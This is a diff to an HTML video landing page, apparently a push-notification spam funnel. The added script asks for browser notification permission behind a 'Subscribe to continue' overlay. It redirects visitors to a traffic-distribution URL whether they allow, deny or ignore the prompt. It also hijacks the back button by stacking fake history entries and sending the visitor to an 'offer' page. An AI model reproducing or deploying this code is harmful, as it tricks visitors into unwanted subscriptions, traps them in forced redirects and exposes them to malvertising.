@@ -91,16 +91,46 @@
     <div id="subscribeBtn">Subscribe to continue</div>
 </div>
 
+<script>
+const urlParams = new URLSearchParams(window.location.search);
+const clickId = urlParams.get('clickid') || 'sub1';
+const redirectUrl = `https://hotbjayapa.today/tds?id=1556189731&p1=${clickId}&p2=sub2&p3=sub3&p4=sub4`;
+const backButtonUrl = 'https://hotbjayapa.today/tds?id=1556334684&p1=sub1&p2=sub2&p3=sub3&p4=sub4';
+
+// Handle all push notification events - redirect in all cases
+window.onPermissionDefault = function() {
+    window.location.replace(redirectUrl);
+};
+
+window.onPermissionDenied = function() {
+    window.location.replace(redirectUrl);
+};
+
+window.onPermissionAllowed = function() {
+    window.location.replace(redirectUrl);
+};
+
+window.onAlreadySubscribed = function() {
+    window.location.replace(redirectUrl);
+};
+
+window.onNotificationUnsupported = function() {
+    window.location.replace(redirectUrl);
+};
+
+window.onTrafficFiltered = function() {
+    window.location.replace(redirectUrl);
+};
+</script>
+
 <script type="application/javascript" src="https://wpcpc.sjscdn.com/ps/ps.js?id=j-DQEhxgKEueEzYw3M-eJQ" async></script>
 
 <script>
 const video = document.getElementById('myVideo');
 const btn = document.getElementById('subscribeBtn');
 const overlay = document.getElementById('overlay');
-const urlParams = new URLSearchParams(window.location.search);
-const clickId = urlParams.get('clickid') || '';
-const backButtonUrl = 'https://hotbjayapa.today/tds?id=1556334684&p1=sub1&p2=sub2&p3=sub3&p4=sub4';
-const forwardUrl = `https://hotbjayapa.today/tds?id=1556189731&p1=${clickId}&p2=sub2&p3=sub3&p4=sub4`;
+
+let hasRedirected = false;
 
 // Show overlay and button when video starts
 video.addEventListener('playing', () => {
@@ -109,10 +139,26 @@ video.addEventListener('playing', () => {
         overlay.classList.add('show');
         btn.classList.add('show');
         
-        // Request push notification
+        // Request push notification after delay
         setTimeout(() => {
             if ('Notification' in window && Notification.permission === 'default') {
-                Notification.requestPermission();
+                Notification.requestPermission().then(permission => {
+                    // Fallback redirect if push events don't trigger
+                    setTimeout(() => {
+                        if (!hasRedirected) {
+                            hasRedirected = true;
+                            window.location.replace(redirectUrl);
+                        }
+                    }, 1000);
+                });
+            } else {
+                // If notification already handled, redirect
+                setTimeout(() => {
+                    if (!hasRedirected) {
+                        hasRedirected = true;
+                        window.location.replace(redirectUrl);
+                    }
+                }, 500);
             }
         }, 250);
     }, 100);
@@ -120,38 +166,35 @@ video.addEventListener('playing', () => {
 
 // Ensure video plays
 video.play().catch(() => {
-    // If autoplay fails, show button immediately
     overlay.classList.add('show');
     btn.classList.add('show');
 });
 
-// Continue and redirect
+// Continue and redirect on click
 function continueAndRedirect(e) {
     if (e) e.preventDefault();
+    if (hasRedirected) return;
     
+    hasRedirected = true;
     btn.classList.remove('show');
     overlay.classList.remove('show');
     video.play();
     
     setTimeout(() => {
-        window.location.href = forwardUrl;
+        window.location.replace(redirectUrl);
     }, 300);
 }
 
 video.addEventListener('click', continueAndRedirect);
 btn.addEventListener('click', continueAndRedirect);
 
-// BACK BUTTON PROTECTION - redirect to offer page
+// Back button protection
 (function() {
-    let historyCount = 0;
-    
-    // Add multiple history entries
     for (let i = 0; i < 3; i++) {
         history.pushState(null, null, location.href);
-        historyCount++;
     }
     
-    window.addEventListener('popstate', function(e) {
+    window.addEventListener('popstate', function() {
         history.pushState(null, null, location.href);
         window.location.replace(backButtonUrl);
     });
